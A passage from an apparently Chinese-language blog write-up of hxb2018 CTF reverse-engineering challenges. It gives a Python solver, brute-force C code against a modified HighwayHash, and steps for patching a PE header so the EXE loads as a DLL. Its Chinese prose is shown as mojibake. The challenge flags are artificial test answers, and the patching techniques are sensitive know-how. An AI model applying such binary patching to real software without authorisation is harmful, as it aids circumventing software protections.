class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>, <span class="number">61</span>, <span class="number">100</span>, <span class="number">93</span>, <span class="number">25</span>, <span class="number">115</span>, <span class="number">96</span>, <span class="number">129</span>, <span class="number">79</span>, <span class="number">220</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">144</span>, <span class="number">136</span>, <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>, <span class="number">20</span>, <span class="number">222</span>, <span class="number">94</span>, <span class="number">11</span>, <span class="number">219</span>, <span class="number">224</span>, <span class="number">50</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">73</span>, <span class="number">6</span>, <span class="number">36</span>, <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>, <span class="number">172</span>, <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>, <span class="number">55</span>, <span class="number">109</span>, <span class="number">141</span>, <span class="number">213</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>, <span class="number">174</span>, <span class="number">8</span>, <span class="number">186</span>, <span class="number">120</span>, <span class="number">37</span>, <span class="number">46</span>, <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>, <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>, <span class="number">31</span>, <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>, <span class="number">62</span>, <span class="number">181</span>, <span class="number">102</span>, <span class="number">72</span>, <span class="number">3</span>, <span class="number">246</span>, <span class="number">14</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">87</span>, <span class="number">185</span>, <span class="number">134</span>, <span class="number">193</span>, <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>, <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>, <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>, <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>, <span class="number">85</span>, <span class="number">40</span>, <span class="number">223</span>, <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>, <span class="number">66</span>, <span class="number">104</span>, <span class="number">65</span>, <span class="number">153</span>, <span class="number">45</span>, <span class="number">15</span>, <span class="number">176</span>, <span class="number">84</span>, <span class="number">187</span>, <span class="number">22</span>, <span class="number">72</span>]</span><br><span class="line">token = [<span class="number">50</span>, <span class="number">97</span>, <span class="number">52</span>, <span class="number">57</span>, <span class="number">102</span>, <span class="number">54</span>, <span class="number">57</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">51</span>, <span class="number">57</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">57</span>, <span class="number">54</span>, <span class="number">100</span>, <span class="number">54</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">57</span>, <span class="number">54</span>, <span class="number">100</span>, <span class="number">54</span>, <span class="number">102</span>, <span class="number">52</span>, <span class="number">101</span>, <span class="number">48</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">56</span>, <span class="number">52</span>, <span class="number">57</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">100</span>, <span class="number">54</span>, <span class="number">49</span>, <span class="number">57</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">56</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">54</span>, <span class="number">101</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">54</span>, <span class="number">101</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">100</span>, <span class="number">53</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">54</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">35</span>:</span><br><span class="line">    <span class="keyword">for</span> flag <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        v6 = (flag &gt;&gt; <span class="number">4</span>) % <span class="number">16</span></span><br><span class="line">        v7 = (<span class="number">16</span> * flag &gt;&gt; <span class="number">4</span>) % <span class="number">16</span></span><br><span class="line">        v8 = token[<span class="number">2</span> * i]</span><br><span class="line">        <span class="keyword">if</span> (v8 &lt; <span class="number">48</span> <span class="keyword">or</span> v8 &gt; <span class="number">57</span>):</span><br><span class="line">            v9 = v8 - <span class="number">87</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v9 = v8 - <span class="number">48</span></span><br><span class="line">        v10 = token[<span class="number">2</span> * i + <span class="number">1</span>]</span><br><span class="line">        v11 = <span class="number">16</span> * v9</span><br><span class="line">        <span class="keyword">if</span> (v10 &lt; <span class="number">48</span> <span class="keyword">or</span> v10 &gt; <span class="number">57</span>):</span><br><span class="line">            v12 = v10 - <span class="number">87</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v12 = v10 - <span class="number">48</span></span><br><span class="line">        <span class="keyword">if</span> target[<span class="number">16</span> * v6 + v7] == (v11 + v12) ^ <span class="number">0x19</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(flag))</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"><span class="comment"># flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>flag : flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}</p>
<h3 id="2-Highwayhash"><a href="#2-Highwayhash" class="headerlink" title="2. Highwayhash"></a>2. Highwayhash</h3><p>ä¸Šç½‘æ‰¾æ‰¾ highwayhashï¼Œåœ¨ github ä¸Šé¢æ‰¾åˆ°äº†å®ƒï¼Œæ˜¯ google ä¼˜åŒ–ç°æœ‰ hash ç®—æ³•çš„ä¸€ä¸ªé¡¹ç›®ï¼Œçœ‹çœ‹æºä»£ç å‘ç°å’Œåæ±‡ç¼–çš„ç»“æœå¾ˆç›¸ä¼¼ï¼Œåº”è¯¥æ˜¯å‡ºé¢˜äººæ‹¿æºç ç›´æ¥ä¿®æ”¹çš„(äº‹å®è¯æ˜åªä¿®æ”¹äº† HighwayHashReset å‡½æ•°é‡Œé¢çš„ä¸€äº›ä¸œè¥¿)ï¼Œä¸åŒçš„åœ°æ–¹æ˜¯ keyã€‚<br>å›å¤´ç»§ç»­çœ‹ä¼ªä»£ç ï¼Œæœ‰ä¸€ä¸ªæç¤ºï¼š<strong>Please enter flag(Note:hxb2018{digital}:</strong> ï¼Œ flag çš„æ ¼å¼åº”è¯¥æ˜¯ hxb2018{çº¯æ•°å­—}ï¼Œæ¥ç€æ˜¯è°ƒç”¨äº†ä¸¤æ¬¡ hashï¼Œç¬¬ä¸€æ¬¡åŠ å¯†äº† flag çš„é•¿åº¦ï¼Œç¬¬äºŒæ¬¡åŠ å¯†çš„ flag çš„å†…å®¹(åˆ¨é™¤ hxb2018{} å¤–å£³)ï¼Œä¸¤æ¬¡åŠ å¯†éƒ½åªç»™å‡ºäº† hash çš„ç»“æœã€‚<br>æƒ³è¦ç®—å‡ºç¬¬ä¸€ä¸ª hash æ¯”è¾ƒç®€å•ï¼Œç›´æ¥åŠ¨æ€è°ƒè¯• + æ‰‹åŠ¨çˆ†ç ´å°±å¯ä»¥ï¼Œæœ€åç®—å‡ºçš„ flag é•¿åº¦æ˜¯ 19ï¼Œé™¤å» flag çš„å¤–å£³çº¯æ•°å­—çš„éƒ¨åˆ†åªæœ‰ 10 ä½ï¼Œä¹Ÿå°±æ˜¯è¯´ flag çš„å¯èƒ½æ€§æœ‰ 10^10 &#x3D; ä¸€ç™¾äº¿ä¸ª<br>ä¸ç®—å¤ªå¤šï¼Œåº”è¯¥å¯ä»¥çˆ†ç ´å‡ºæ¥ï¼Œè¿™é“é¢˜ç®€å•çš„æ€è·¯æœ‰ä¸¤ç§ï¼Œç¬¬ä¸€ä¸ªæ˜¯æŠŠ github ä¸Šé¢çš„æºä»£ç æ‹–ä¸‹æ¥ï¼Œä¿®æ”¹ä¸€ä¸‹ç›´æ¥çˆ†ç ´ï¼Œå¦ä¸€ä¸ªæ˜¯è°ƒç¨‹åºé‡Œé¢çš„å‡½æ•°ï¼Œéœ€è¦å…ˆä¿®æ”¹ä¸€ä¸‹ PE å¤´ï¼Œç„¶åç¼–å†™å¦ä¸€ä¸ªç¨‹åºï¼ŒæŠŠè¿™é“é¢˜å½“åš dll åŠ è½½ã€‚<br>ç¬¬ä¸€ç§æ–¹æ³•ï¼šå…‹éš† github ä¸Šé¢çš„ä»£ç ï¼Œkey ä»€ä¹ˆçš„å°±ä¸éœ€è¦ç®¡äº†ï¼Œä¿®æ”¹å¥½ä»£ç ä¹‹åå»çˆ†ç ´ï¼Œå…ˆæŠŠ highwayhash.c é‡Œé¢çš„ HighwayHashReset å‡½æ•°ä¿®æ”¹æˆ</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">HighwayHashReset</span><span class="params">(<span class="type">const</span> <span class="type">uint64_t</span> key[<span class="number">4</span>], HighwayHashState* state)</span> &#123;</span><br><span class="line">  state-&gt;mul0[<span class="number">0</span>] = <span class="number">0x1BE6D5D5FE4CCE2F</span>;</span><br><span class="line">  state-&gt;mul0[<span class="number">1</span>] = <span class="number">0x24093822299F31D0</span>;</span><br><span class="line">  state-&gt;mul0[<span class="number">2</span>] = <span class="number">0x33198A2E03707344</span>;</span><br><span class="line">  state-&gt;mul0[<span class="number">3</span>] = <span class="number">0x443F6A8885A308D3</span>;</span><br><span class="line">  state-&gt;mul1[<span class="number">0</span>] = <span class="number">0x5BD39E10CB0EF593</span>;</span><br><span class="line">  state-&gt;mul1[<span class="number">1</span>] = <span class="number">0x60ACF169B5F18A8C</span>;</span><br><span class="line">  state-&gt;mul1[<span class="number">2</span>] = <span class="number">0x7E5466CF34E90C6C</span>;</span><br><span class="line">  state-&gt;mul1[<span class="number">3</span>] = <span class="number">0x852821E638D01377</span>;</span><br><span class="line">  state-&gt;v0[<span class="number">0</span>] = <span class="number">0xCF0C0C1ED5EDF3E</span>;</span><br><span class="line">  state-&gt;v0[<span class="number">1</span>] = state-&gt;mul0[<span class="number">1</span>] ^ <span class="number">0x3F3E3D3C3B3A1918</span>;</span><br><span class="line">  state-&gt;v0[<span class="number">2</span>] = state-&gt;mul0[<span class="number">2</span>] ^ <span class="number">0x1226252423222121</span>;</span><br><span class="line">  state-&gt;v0[<span class="number">3</span>] = state-&gt;mul0[<span class="number">3</span>] ^ <span class="number">0x2F2E2D2C2B2A2928</span>;</span><br><span class="line">  state-&gt;v1[<span class="number">0</span>] = state-&gt;mul1[<span class="number">0</span>] ^ <span class="number">0x1312111117161514</span>;</span><br><span class="line">  state-&gt;v1[<span class="number">1</span>] = state-&gt;mul1[<span class="number">1</span>] ^ <span class="number">0x3B3A19183F3E3D3C</span>;</span><br><span class="line">  state-&gt;v1[<span class="number">2</span>] = state-&gt;mul1[<span class="number">2</span>] ^ <span class="number">0x2322212112262524</span>;</span><br><span class="line">  state-&gt;v1[<span class="number">3</span>] = state-&gt;mul1[<span class="number">3</span>] ^ <span class="number">0x2B2A29282F2E2D2C</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå¦å†™ä¸€ä»½ä»£ç (å¯ä»¥å‚è€ƒç»™å‡ºçš„ highwayhash_test.c æ¥å†™)ï¼Œå…ˆæ‹¿é•¿åº¦æµ‹è¯•ä¸€ä¸‹ä¿®æ”¹çš„æ˜¯å¦æ­£ç¡®ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// g++ 0.c highwayhash.c -o test -O3</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;highwayhash.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> key[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">uint8_t</span> data[<span class="number">4</span>]=&#123;<span class="number">19</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%llx&quot;</span>,HighwayHash64(data, <span class="number">4</span>, key));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>æ³¨æ„è¦ç”¨ <strong>g++ 0.c highwayhash.c -o test -O3</strong> è¿›è¡Œè”åˆç¼–è¯‘ï¼Œå¼€å¯ 3 çº§ä¼˜åŒ–ã€‚<br>ç„¶åè¿è¡Œä»£ç ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online1.png"
                      alt="image"
                ></p>
<p>ç»“æœæ­£ç¡®ï¼Œç°åœ¨å°±å¯ä»¥å¼€å§‹çˆ†ç ´äº†ã€‚</p>
<p>å€Ÿç”¨å¤§ä½¬çš„ä»£ç (<a class="link"   href="https://blog.csdn.net/uiop_uiop_uiop/article/details/84207231" >é“¾æ¥<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;highwayhash.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> key[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">uint8_t</span> data[<span class="number">11</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">uint8_t</span> v1=<span class="string">&#x27;9&#x27;</span>;v1&gt;=<span class="string">&#x27;0&#x27;</span>;v1--)&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">uint8_t</span> v2=<span class="string">&#x27;9&#x27;</span>;v2&gt;=<span class="string">&#x27;0&#x27;</span>;v2--)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">uint8_t</span> v3=<span class="string">&#x27;9&#x27;</span>;v3&gt;=<span class="string">&#x27;0&#x27;</span>;v3--)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">uint8_t</span> v4=<span class="string">&#x27;9&#x27;</span>;v4&gt;=<span class="string">&#x27;0&#x27;</span>;v4--)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">uint8_t</span> v5=<span class="string">&#x27;9&#x27;</span>;v5&gt;=<span class="string">&#x27;0&#x27;</span>;v5--)&#123;</span><br><span class="line">					<span class="keyword">for</span>(<span class="type">uint8_t</span> v6=<span class="string">&#x27;9&#x27;</span>;v6&gt;=<span class="string">&#x27;0&#x27;</span>;v6--)&#123;</span><br><span class="line">						<span class="keyword">for</span>(<span class="type">uint8_t</span> v7=<span class="string">&#x27;9&#x27;</span>;v7&gt;=<span class="string">&#x27;0&#x27;</span>;v7--)&#123;</span><br><span class="line">							<span class="keyword">for</span>(<span class="type">uint8_t</span> v8=<span class="string">&#x27;9&#x27;</span>;v8&gt;=<span class="string">&#x27;0&#x27;</span>;v8--)&#123;</span><br><span class="line">								<span class="keyword">for</span>(<span class="type">uint8_t</span> v9=<span class="string">&#x27;9&#x27;</span>;v9&gt;=<span class="string">&#x27;0&#x27;</span>;v9--)&#123;</span><br><span class="line">									<span class="keyword">for</span>(<span class="type">uint8_t</span> v10=<span class="string">&#x27;9&#x27;</span>;v10&gt;=<span class="string">&#x27;0&#x27;</span>;v10--)&#123;</span><br><span class="line">										data[<span class="number">0</span>]=v1;</span><br><span class="line">										data[<span class="number">1</span>]=v2;</span><br><span class="line">										data[<span class="number">2</span>]=v3;</span><br><span class="line">										data[<span class="number">3</span>]=v4;</span><br><span class="line">										data[<span class="number">4</span>]=v5;</span><br><span class="line">										data[<span class="number">5</span>]=v6;</span><br><span class="line">										data[<span class="number">6</span>]=v7;</span><br><span class="line">										data[<span class="number">7</span>]=v8;</span><br><span class="line">										data[<span class="number">8</span>]=v9;</span><br><span class="line">										data[<span class="number">9</span>]=v10;</span><br><span class="line">                                        <span class="comment">//printf(&quot;NOW : %s  \n&quot;, data);</span></span><br><span class="line">										<span class="keyword">if</span>(HighwayHash64(data, <span class="number">10</span>, key) == <span class="number">0x7CDCCF71350B7DB8</span>)&#123;</span><br><span class="line">											<span class="built_in">puts</span>((<span class="type">char</span> *)data);</span><br><span class="line">                                                                                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">										&#125;</span><br><span class="line">										</span><br><span class="line">  &#125;    &#125;    &#125;    &#125;    &#125;    &#125;    &#125;    &#125;    &#125;  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯åå‘çˆ†ç ´çš„ï¼Œæ¯”æ­£å‘çˆ†ç ´èŠ‚çœä¸€äº›æ—¶é—´ï¼Œå¤§æ¦‚ 10 åˆ†é’Ÿå·¦å³è·‘å‡ºäº†ç­”æ¡ˆï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online2.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online3.png"
                      alt="image"
                ></p>
<p>ç¬¬äºŒç§æ–¹æ³•ï¼šä¿®æ”¹ exeï¼Œä½¿ç”¨å¦å¤–ä¸€ä¸ªç¨‹åºåŠ è½½ï¼Œè°ƒç”¨ç¨‹åºè‡ªå·±çš„ hash å‡½æ•°ï¼Œç›´æ¥åŠ è½½å½“ç„¶æ˜¯ä¸è¡Œçš„ï¼Œè¿™å’Œ PE çš„ç»“æ„æœ‰å…³ç³»ï¼Œé¦–å…ˆä½¿ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ç¼–è¾‘æºæ–‡ä»¶ï¼Œæ¨èä½¿ç”¨ 010ï¼Œæ‰¾åˆ° PE å¤´ä¸­çš„ NtHeader â€“&gt; Characteristics â€“&gt; IMAGE_FILE_DLL è¿™ä¸ªå­—æ®µï¼Œä¿®æ”¹ä¸º 1ï¼Œè¿™æ ·å°±èƒ½æŠŠè¿™ä¸ªç¨‹åºå½“åš DLL è°ƒç”¨äº†ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online4.png"
                      alt="image"
                ></p>
<p>ä¿®æ”¹ä¹‹åçš„æ•ˆæœï¼Œå†æ¬¡åŒå‡»è¿™ä¸ªç¨‹åºä¸èƒ½è¿è¡Œï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online5.png"
                      alt="image"
                ></p>
<p>ç°åœ¨è¿˜æœ‰ä¸¤ä¸ªé—®é¢˜éœ€è¦è§£å†³ã€‚</p>
<p>ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œä»…ä»…ä¿®æ”¹äº† IMAGE_FILE_DLL å¹¶ä¸èƒ½ç›´æ¥ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œè¿˜éœ€è¦ä¿®æ”¹ç¨‹åºçš„å…¥å£ç‚¹(åŸºåœ°å€)ï¼Œç”±äº EXE ä¸å­˜åœ¨å¯¼å‡ºè¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è°ƒç”¨å†…éƒ¨å‡½æ•°çš„æ—¶å€™éœ€è¦æ ¹æ® EXE çš„ RVA åŠ ä¸ŠåŸºåœ°å€æ‰èƒ½æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°ï¼ŒRVA(å³ç›¸å¯¹è™šæ‹Ÿåœ°å€)å¯ä»¥ä½¿ç”¨ IDA æŸ¥çœ‹ï¼Œä¿®æ”¹å…¥å£ç‚¹å¯ä»¥ä½¿ç”¨å·¥å…· PE Editorã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online7.png"
                      alt="image"
                ></p>
<p>ç„¶åå°±å¯ä»¥ä½¿ç”¨è¿™ä¸ª â€œDLLâ€ äº†ï¼  </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> __int64 (__fastcall *highwayhash)(__int64 buff, <span class="type">unsigned</span> __int64 len);    <span class="comment">// å®šä¹‰å‡½æ•°è¿”å›å€¼ç±»å‹ä»¥åŠå‚æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HMODULE hdll;</span><br><span class="line">    hdll = LoadLibrary(TEXT(<span class="string">&quot;C:\\Users\\lenovo\\Desktop\\reverse.dll&quot;</span>));    <span class="comment">// åŠ è½½ ä¿®æ”¹ä¹‹åçš„ç¨‹åº</span></span><br><span class="line">    <span class="keyword">if</span>(hdll == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Load dll failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DLL base: %llx\n&quot;</span>,hdll);    <span class="comment">// dll çš„åŸºå€</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Solving length...\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> result;</span><br><span class="line">    <span class="keyword">for</span>(len = <span class="number">0</span>; len &lt; <span class="number">50</span>; len++)</span><br><span class="line">    &#123;</span><br><span class="line">        result = ((highwayhash)((PBYTE)hdll + <span class="number">0x17a0</span>))((<span class="type">long</span> <span class="type">long</span> )&amp;len, <span class="number">4</span>);    <span class="comment">// è°ƒç”¨å‡½æ•° ç¬¬ä¸€æ¬¡çˆ†ç ´ flag çš„é•¿åº¦</span></span><br><span class="line">        <span class="keyword">if</span>(result == <span class="number">0xD31580A28DD8E6C4</span>)                                        <span class="comment">// ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ 4 å­—èŠ‚çš„ç©ºé—´æŒ‡é’ˆï¼Œç¬¬äºŒä¸ªæ˜¯é•¿åº¦</span></span><br><span class="line">        &#123;                                                                       <span class="comment">// è°ƒç”¨å‡½æ•°çš„æ ¼å¼ä¸€å®šè¦éµå¾ªè¿™ç§æ ‡å‡†</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]FOUND Length: %d\n&quot;</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Solving flag...\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">5299999999</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        sprintf_s(buff, <span class="string">&quot;%0.10llu&quot;</span>, i);    <span class="comment">// ç”±äºä¼ é€’çš„å‚æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå¯ä»¥ä½¿ç”¨ sprintf å¿«é€Ÿåˆ¶ä½œå‡ºç¬¦åˆè¦æ±‚çš„åœ°å€ç©ºé—´ã€‚</span></span><br><span class="line">        result = ((highwayhash)((PBYTE)hdll + <span class="number">0x17a0</span>))((<span class="type">long</span> <span class="type">long</span> )buff, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span>(result == <span class="number">0x7CDCCF71350B7DB8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]FOUND: %s\n&quot;</span>, buff);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(i % <span class="number">100000</span> == <span class="number">0</span>)    <span class="comment">// æ³¨æ„ä¸è¦æŠŠæ¯ä¸€ä¸ªå°è¯•çš„æ•°å­—éƒ½è¾“å‡ºï¼Œä¼šå¯¼è‡´ stdout æº¢å‡ºæ— æ³•æ˜¾ç¤ºåç»­ç»“æœã€‚</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*]Trying %0.10llu\n&quot;</span>, i);  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>å¦ä¸€ä¸ªé—®é¢˜æ˜¯ç¼–è¯‘å‚æ•°ï¼Œé¢˜ç›®æ˜¯ PE32+(64 ä½çš„ PE)ï¼Œé‚£æˆ‘ä»¬è‡ªå·±å†™çš„å¤–æŒ‚ä¹Ÿéœ€è¦æ˜¯ 64 ä½çš„ï¼Œåœ¨ windows ä¸Šç¼–è¯‘ 64 ä½ç¨‹åºæœ‰è®¸å¤šåŠæ³•ï¼Œæˆ‘å»ç½‘ä¸Šä¸‹è½½äº† mingw64 ï¼Œå®‰è£…åˆ°ç”µè„‘ä¸Šå°±å¯ä»¥æŠŠä»£ç ç¼–è¯‘æˆ 64 ä½ç¨‹åºã€‚<br>ç¼–è¯‘é€‰é¡¹ï¼š  <strong>g++ -m64 0.cpp -o test -O3</strong></p>
<p>ç”±äºå·²ç»çŸ¥é“äº† flag æ˜¯å¤šå°‘ï¼Œç›´æ¥å¡«å†™ 5299999999 è¿™ä¸ªå€¼ï¼Œå¿«é€Ÿç®—å‡ºç­”æ¡ˆï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/hxb2018online6.png"
                      alt="image"
                ></p>
<p>å’Œç¬¬ä¸€ç§åšæ³•å¾—å‡ºçš„ç­”æ¡ˆç›¸åŒã€‚</p>
<h3 id="3-More-efficient-than-JS"><a href="#3-More-efficient-than-JS" class="headerlink" title="3. More efficient than JS"></a>3. More efficient than JS</h3><p>è¿™æ˜¯ä¸€é“ WASM çš„é€†å‘é¢˜ç›®ï¼Œä¹‹å‰æ˜¯è§è¿‡ä¸€æ¬¡çš„ï¼ŒWASM æ˜¯ WebAssembly ç¼–è¯‘æ ¼å¼ç¼–è¯‘å‡ºçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™ç§ç¼–è¯‘æ ¼å¼å¯ä»¥å°† C æˆ– C++ ä»£ç ç¼–è¯‘æˆ wasm æ–‡ä»¶ï¼Œå¼€å‘è€…å¯ä»¥ç”¨ JS ä½œä¸ºæ¡¥æ¢ï¼Œåœ¨ç½‘é¡µä¸Šç›´æ¥åº”ç”¨è¿™ç§äºŒè¿›åˆ¶ç¨‹åºã€‚</p>
